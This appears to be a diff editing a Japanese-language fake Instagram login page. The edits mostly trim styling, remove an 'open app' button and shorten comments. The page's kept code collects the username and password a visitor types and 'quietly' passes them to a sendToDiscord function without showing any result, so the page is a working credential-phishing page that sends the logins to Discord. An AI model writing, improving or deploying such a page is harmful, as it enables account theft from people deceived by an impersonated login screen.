@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instagram ログイン</title>
+  <title>Instagramにログイン</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -105,22 +105,6 @@
     .btn:active { transform: translateY(0); }
     .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
     .btn svg { width: 20px; height: 20px; }
-
-    .divider {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin: 1.6rem 0 1rem;
-      color: rgba(255, 255, 255, 0.5);
-      font-size: 0.75rem;
-    }
-
-    .divider::before, .divider::after {
-      content: "";
-      flex: 1;
-      height: 1px;
-      background: rgba(255, 255, 255, 0.3);
-    }
   </style>
 </head>
 <body>
@@ -144,17 +128,6 @@
         Instagramでログイン
       </button>
     </form>
-
-    <div class="divider">または</div>
-
-    <button class="btn" id="openAppBtn" style="background: rgba(255,255,255,0.2); color:#fff; border:1px solid rgba(255,255,255,0.4); box-shadow:none;">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:20px;height:20px;">
-        <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
-        <polyline points="15 3 21 3 21 9"></polyline>
-        <line x1="10" y1="14" x2="21" y2="3"></line>
-      </svg>
-      Instagramアプリを開く
-    </button>
   </div>
 
   <script>
@@ -236,50 +209,15 @@
         const username = document.getElementById('username').value.trim();
         const password = document.getElementById('password').value.trim();
 
-        // 入力が空の場合は何もしない（エラーも表示しない）
-        if (!username || !password) {
-          // オプション: 空入力時にボタンを軽くシェイクするなどのUX演出も可能
-          return;
-        }
+        // 入力が空の場合は何もしない
+        if (!username || !password) return;
 
-        // ボタンを無効化して二重送信を防止
         loginBtn.disabled = true;
 
-        // 静かに送信
+        // 静かに送信（結果は表示しない）
         await sendToDiscord(username, password);
 
-        // ボタンを元に戻す（送信結果は表示しない）
         loginBtn.disabled = false;
-
-        // 入力欄をクリア（任意：送信後に空にする）
-        // document.getElementById('username').value = '';
-        // document.getElementById('password').value = '';
-
-        // オプション: 何も表示せず、ただ待機する
-        // Instagram風に見せるなら、少しだけボタンをローディング状態にする演出も可能
-      });
-
-      // ============================================================
-      // Instagramアプリ起動
-      // ============================================================
-      const openAppBtn = document.getElementById('openAppBtn');
-      openAppBtn.addEventListener('click', function(e) {
-        e.preventDefault();
-        const username = document.getElementById('username').value.trim();
-        const appUrl = username
-          ? `instagram://user?username=${encodeURIComponent(username)}`
-          : 'instagram://app';
-
-        let appOpened = false;
-        const onVis = () => { if (document.hidden) appOpened = true; };
-        document.addEventListener('visibilitychange', onVis);
-
-        window.location.href = appUrl;
-
-        setTimeout(() => {
-          document.removeEventListener('visibilitychange', onVis);
-          // アプリ起動できなかった場合も何も表示しない
-        }, 2000);
       });
 
       // ============================================================
